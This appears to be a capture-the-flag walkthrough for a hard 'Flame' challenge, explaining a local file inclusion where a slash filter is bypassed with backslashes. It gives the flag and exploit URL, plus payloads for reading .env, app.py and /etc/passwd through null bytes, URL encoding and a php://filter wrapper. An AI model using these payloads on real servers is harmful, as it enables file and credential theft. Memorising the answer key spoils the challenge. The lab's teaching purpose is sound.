# Flame Walkthrough

## Challenge Overview
**Difficulty**: Hard  
**Vulnerability**: Local File Inclusion (LFI)  
**Flag**: nhc{f1l3_p4th_tr4v3rs3d_w1th_fl4m3}

## Story Context
Hattori enters the Echo Chamber, where flames reveal paths to hidden chambers through careful traversal.

## Solution Steps

### Step 1: Access the Challenge
1. Navigate to `/challenge/flame`
2. Observe the sample echo link and chamber description

### Step 2: Understand the Vulnerability
The backend processes:
```python
path = f'uploads/{scroll}'.replace('\\', '/')
```

### Step 3: Test Basic LFI
1. Try the sample: `/challenge/flame/view?scroll=sample.txt`
2. Should display: "This is a sample relic from the vault." and when you try lfi using basic ../ method it should show like echo error something like that

### Step 4: Bypass Path Restrictions
1. Blocked: `/` (forward slash)
2. Allowed: `\` (backslash), which gets converted to `/`
3. Use `..` for directory traversal

### Step 5: Access Hidden Directory
1. Traverse to parent directory: `..\hidden\final_fragment.txt`
2. Full payload: `/challenge/flame/view?scroll=..\hidden\final_fragment.txt`
3. The backslashes become forward slashes, creating: `uploads/../hidden/final_fragment.txt`

### Step 6: Extract the Flag
The response should contain: `nhc{f1l3_p4th_tr4v3rs3d_w1th_fl4m3}`

## Hints

### Hint 1
> The chamber echoes files from the uploads directory. But what if you could reach beyond that?

### Hint 2
> The system blocks forward slashes but allows backslashes. How does it handle the conversion?

### Hint 3
> Directory traversal uses `..` to move up directories. Combine this with the path conversion for access.

## Educational Notes

### What You Learned
- **Local File Inclusion**: Including files from the server filesystem
- **Path Traversal**: Using `..` to access parent directories
- **Input Sanitization**: Bypassing filters through character conversion
- **Directory Structure**: Understanding web application file organization

### Real-World Impact
- Sensitive file disclosure
- Source code exposure
- Configuration file access
- Log file reading

### Prevention
- Input validation and sanitization
- Path canonicalization
- Whitelist allowed files
- Use indirect file access
- Proper permission controls

## Alternative Payloads

### Basic Traversal
```
..\hidden\final_fragment.txt
```

### Source Code Disclosure
```
..\..\..\app.py
```

### Configuration Access
```
..\..\..\.env
```

### Log File Reading
```
..\..\..\logs\access.log
```
the above paylods wont work as for added security purpose the /flame/scroll?view= only allow hidden and secret in it other payloads wont work 
## Testing Techniques

### Manual Testing
1. Start with known files
2. Test traversal step by step
3. Verify path conversion

### Python Simulation
```python
def test_lfi(scroll):
    path = f'uploads/{scroll}'.replace('\\', '/')
    print(f"Original: uploads/{scroll}")
    print(f"Converted: {path}")
    return path

# Test the payload
test_lfi('..\\hidden\\final_fragment.txt')
```

## Common Mistakes
- Using forward slashes instead of backslashes
- Wrong number of `..` for traversal
- Incorrect file path or name
- Not understanding the replace operation

## Path Conversion Logic

### Input Processing
```
Input: ..\hidden\final_fragment.txt
Replace \ with /: ../hidden/final_fragment.txt
Full path: uploads/../hidden/final_fragment.txt
Resolved: hidden/final_fragment.txt
```

### Security Bypass
- Filter blocks `/` but allows `\`
- Application converts `\` to `/`
- Results in valid path traversal

## Advanced Techniques

### Null Byte Injection
```
..\..\..\etc\passwd%00.jpg
```

### Encoding Bypass
```
..%2f..%2f..%2fetc%2fpasswd
```

### Wrapper Exploitation
```
php://filter/convert.base64-encode/resource=../../../etc/passwd
```

## Next Steps
Submit the flag to complete all challenges and access the finale.
